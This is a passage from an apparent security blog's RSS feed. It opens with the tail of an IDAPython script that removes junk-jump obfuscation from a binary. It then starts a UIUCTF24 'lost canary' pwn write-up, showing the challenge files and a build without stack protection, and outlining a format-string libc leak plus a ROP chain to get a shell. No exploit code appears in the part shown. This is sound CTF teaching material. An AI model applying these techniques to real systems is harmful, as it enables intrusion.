class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# NOP out the bogus instruction &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                idc.patch_byte(curr_addr + i, &lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# skip the next 5 bytes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            curr_addr += &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# force create an instruction at the jump address in IDB&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            idc.create_insn(jmp_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# decode the instruction at the jump address so we can get the new jump address (chain basically)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            jmp_insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            jmp_insn_len = ida_ua.decode_insn(jmp_insn, jmp_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; jmp_insn_len &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; jmp_insn.get_canon_mnem() == &lt;span class=&#34;string&#34;&gt;&amp;#x27;jmp&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                jmp_chain_addr = jmp_insn.Op1.addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;jmp_chain_addr = &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(jmp_chain_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;# NOP out the bogus instruction&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                range_len = jmp_chain_addr - jmp_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(range_len):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    idc.patch_byte(jmp_addr + i, &lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;No valid jump instruction at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(jmp_addr)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# check if it&amp;#x27;s a call instruction&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            insn = ida_ua.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            insn_len = ida_ua.decode_insn(insn, curr_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; insn_len &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; insn.get_canon_mnem() == &lt;span class=&#34;string&#34;&gt;&amp;#x27;call&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;# get the callee&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; insn.Op1.&lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt; == ida_ua.o_near:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    call_target = insn.Op1.addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Found call at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(curr_addr)&amp;#125;&lt;/span&gt; to &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(call_target)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;comment&#34;&gt;# add the target to our list of functions to process&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; call_target &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; [f[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; f &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; functions_to_process]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;comment&#34;&gt;# check if it&amp;#x27;s a valid function&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        func = ida_funcs.get_func(call_target)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; func:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            functions_to_process.append((call_target, func.end_ea))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;comment&#34;&gt;# try and  create a function&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ida_funcs.add_func(call_target):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                func = ida_funcs.get_func(call_target)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; func:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    functions_to_process.append((call_target, func.end_ea))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Warning: Could not create function at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(call_target)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    &lt;span class=&#34;comment&#34;&gt;# still add it to the queue, we&amp;#x27;ll try to determine bounds later&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                    functions_to_process.append((call_target, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;Warning: Could not create function at &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(call_target)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &lt;span class=&#34;comment&#34;&gt;# still add it to the queue, we&amp;#x27;ll try to determine bounds later&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                functions_to_process.append((call_target, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; insn_len &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                curr_addr += insn_len&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                curr_addr += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; functions_to_process&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg_map = get_register_map()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; reg_map:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        reg_map[i] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt; + reg_map[i]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_start = &lt;span class=&#34;number&#34;&gt;0x40B220&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_end = &lt;span class=&#34;number&#34;&gt;0x40BC20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;processed_functions = &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function_queue = deque([(main_start, main_end)])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; function_queue:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    start_addr, end_addr = function_queue.popleft()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; start_addr &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; processed_functions:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# mark the function as processed if not alr processed &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    processed_functions.add(start_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_functions = deobfuscate_function(start_addr, end_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# add new functions to the queue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; new_functions:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; func_start, func_end &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; new_functions:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; func_start &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; processed_functions:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                function_queue.append((func_start, func_end))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;deobfuscation complete, processed &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(processed_functions)&amp;#125;&lt;/span&gt; functions&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This will fix up the entire binary, although you might have to manually fix up some function boundaries by yourself. You can do that by right clicking anywhere inside the function/subroutine already defined.&lt;/p&gt;
&lt;p&gt;The script is kinda massive but I tried my best to make it as clean as possible so I can reuse parts of it later, hopefully someone shows me some goated IDA Python script snippets that are out there somewhere 🙏&lt;/p&gt;
&lt;p&gt;Thank you for reading this super-hurried post! If you have any questions or if I have made any errors, please reach out to me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94LmNvbS90aGVfbTNjaGFuaWNf&#34;&gt;Twitter/X&lt;/span&gt; 😄&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://the-m3chanic.github.io/2024/07/07/Writeup-lost-canary-UIUCTF24/</guid>
            <title>Writeup - lost canary - UIUCTF24</title>
            <link>https://the-m3chanic.github.io/2024/07/07/Writeup-lost-canary-UIUCTF24/</link>
            <category term="Writeup" scheme="https://the-m3chanic.github.io/categories/Writeup/" />
            <category term="Security" scheme="https://the-m3chanic.github.io/tags/Security/" />
            <category term="Reversing" scheme="https://the-m3chanic.github.io/tags/Reversing/" />
            <category term="CTF" scheme="https://the-m3chanic.github.io/tags/CTF/" />
            <category term="Writeup" scheme="https://the-m3chanic.github.io/tags/Writeup/" />
            <category term="Pwn" scheme="https://the-m3chanic.github.io/tags/Pwn/" />
            <pubDate>Sun, 07 Jul 2024 22:34:33 +0000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;lost-canary&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lost-canary&#34;&gt;#&lt;/a&gt; lost-canary&lt;/h1&gt;
&lt;h4 id=&#34;author-spicypete&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#author-spicypete&#34;&gt;#&lt;/a&gt; Author: spicypete&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Damn, I lost my canary at one of the train stations. Can you help me find it?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ncat --ssl lost-canary.chal.uiuc.tf 1337&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Handout:    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ld-2.31.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lost_canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Makefile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc-2.31.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Dockerfile&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;tl; dr:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Reverse to find unique function not containing bad stack canary&lt;/li&gt;
&lt;li&gt;Libc leak using format string vulnerability in printf&lt;/li&gt;
&lt;li&gt;ROP chain to get shell&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;step-1-initial-analysis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#step-1-initial-analysis&#34;&gt;#&lt;/a&gt; Step 1: Initial Analysis&lt;/h2&gt;
&lt;p&gt;Okay, we have quite an interesting handout for your average RE challenge. Makefile, libc, linker and Dockerfile?&lt;/p&gt;
&lt;p&gt;Oh yeah, this is also a pwn challenge. 😃&lt;/p&gt;
&lt;p&gt;I like to get as many ideas/as much information as I can from everything &lt;em&gt;about&lt;/em&gt; or surrounding the challenge as I can, as it usually gives me ideas on what to look for when I start the actual analysis process on the binary.&lt;/p&gt;
&lt;p&gt;So, keeping that in mind, let us first inspect the handout files other than the binary itself.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ cat Dockerfile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FROM ubuntu:20.04 as chroot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FROM gcr.io/kctf-docker/challenge@sha256:eb0f8c3b97460335f9820732a42702c2fa368f7d121a671c618b45bbeeadab28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;COPY --from=chroot / /chroot&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RUN mkdir -p /chroot/home/user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;COPY ./lost_canary /chroot/home/user&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;COPY ./flag.txt /chroot/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;COPY nsjail.cfg /home/user/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CMD kctf_setup &amp;amp;&amp;amp; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   kctf_drop_privs \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  socat \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     TCP-LISTEN:1337,reuseaddr,fork \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     EXEC:&amp;quot;kctf_pow nsjail --config /home/user/nsjail.cfg -- /home/user/lost_canary&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Okay, this tells us there is a flag.txt file in the server, which gives us multiple methods of approaching this challenge already. We can narrow down this funnel as we further progress with the challenge, finalising on one approach in the end.&lt;/p&gt;
&lt;p&gt;Next up, let us look at the Makefile&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ cat Makefile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        python3 gen-canary.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        gcc -O0 program.c -std=gnu99 -fno-stack-protector -Wno-deprecated-declarations -o lost_canary&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;What we see aligns with the name of the challenge as well. We can see that the challenge binary was compiled with the  &lt;code&gt;-fno-stack-protector&lt;/code&gt;  option, what does that do?&lt;/p&gt;
&lt;p&gt;Well, before we discuss that I think a small refresher on the stack would be nice.&lt;/p&gt;
&lt;h3 id=&#34;a-stack-refresher&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#a-stack-refresher&#34;&gt;#&lt;/a&gt; A Stack Refresher&lt;/h3&gt;
&lt;p&gt;(I will be using  &lt;code&gt;x86_64&lt;/code&gt;  as an example to explain)&lt;/p&gt;
&lt;p&gt;The stack is used to store local variables (on a per-function basis) during program runtime.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;It is also important to clarify the difference between 2 terms: &amp;quot;stack space&amp;quot; and &amp;quot;stack frame&amp;quot;.&lt;/p&gt;
&lt;p&gt;Stack space is the space allocated by your OS for your current program, there is one stack space assigned per program, which is some amount of space in the RAM.&lt;/p&gt;
&lt;p&gt;Stack frame is the &amp;quot;stack&amp;quot; structure itself which is used up per-function in your program - each function has its own stack frame.&lt;br /&gt;
Stack frames are constructed and destructed for every function that executes, and there can only be ONE stack frame in the current context at any given time. That means, only one stack pointer ( &lt;code&gt;rsp&lt;/code&gt;  in x86-64), which points to the top of the stack - whichever is in the current context, and one base pointer ( &lt;code&gt;rbp&lt;/code&gt;  in x86-64), which points to the base of the stack in the current context.&lt;/p&gt;
&lt;p&gt;So, if each function needs to have its own frame, we need a way to save each function&#39;s base and top pointers, right?&lt;/p&gt;
&lt;p&gt;First, let us look at how a normal stack looks for a regular function (say  &lt;code&gt;main()&lt;/code&gt; )&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-lost-canary-UIUCTF24/image-2.png&#34; alt=&#34;alt text&#34; /&gt;&lt;/p&gt;
&lt;p&gt;(In actuality, the stack grows &lt;em&gt;downwards&lt;/em&gt; in memory, i.e, the stack pointer is the one moving down when the base pointer stays constant above it, but I am just drawing it this way for easier visualisation)&lt;/p&gt;
&lt;p&gt;Okay, now we need to see how each function can maintain it&#39;s own stack frame while the overall program still uses only 2 pointers - one for the current stack top and another for the current stack base.&lt;/p&gt;
&lt;p&gt;Let us see how  &lt;code&gt;x86-64&lt;/code&gt;  handles this.&lt;/p&gt;
&lt;p&gt;(I am assuming at least basic assembly knowledge at the time of writing this)&lt;/p&gt;
&lt;p&gt;Okay, let us say we are in main, with source code as follows:&lt;/p&gt;
